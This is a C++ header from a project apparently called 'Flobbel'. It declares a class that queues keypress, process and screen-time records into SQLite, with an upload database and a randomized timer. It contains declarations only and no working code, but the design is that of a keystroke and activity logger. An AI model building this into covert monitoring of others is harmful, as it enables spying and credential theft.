//
// Created by Chrystalkey on 01.07.2019.
//

#ifndef FLOBBEL_FLOBBELSAFE_H
#define FLOBBEL_FLOBBELSAFE_H

#include <fstream>
#include <queue>
#include <string>
#include <random>
#include <thread>

#include "dependencies/sqlite/sqlite3.h"

#include "global_functions.h"
#include "capturetypes.h"


typedef void (*InfoCallback)(const Info&);

class FlobbelSafe {
public:
    explicit FlobbelSafe(std::wstring &_safedir, InfoCallback ic);
    ~FlobbelSafe();
    void save(const Info& info);

private: // INFOSTRUCT-PROCESSING FUNCTIONS
    void add_key(const KeypressInfo &);
    void add_prc(const ProcessInfo &);
    void add_screentime(const ScreentimeInfo &);

    InfoCallback ic;

private: // PROCESSING QUEUES
    void finalize_queues();
    std::queue<std::wstring> keyQueue;
    std::queue<std::wstring> prcQueue;

private: //DATABASE INTERNA
    sqlite3 *dbcon, *uploadDBCon = nullptr;
    std::wstring keyTable, proTable;
    bool createNInitDB(const std::wstring &path, sqlite3 **dbptr);

public: // TIMER FUNCTIONS
    //void sync_timer();
    //void sync();

private: // TIMER VARIABLES
    bool end_timer = false;
    std::thread *tmrThread = nullptr;

    std::random_device rd;
    std::mt19937_64 mt;
    std::uniform_int_distribution<uint32_t> dist;
};

#endif //FLOBBEL_FLOBBELSAFE_H
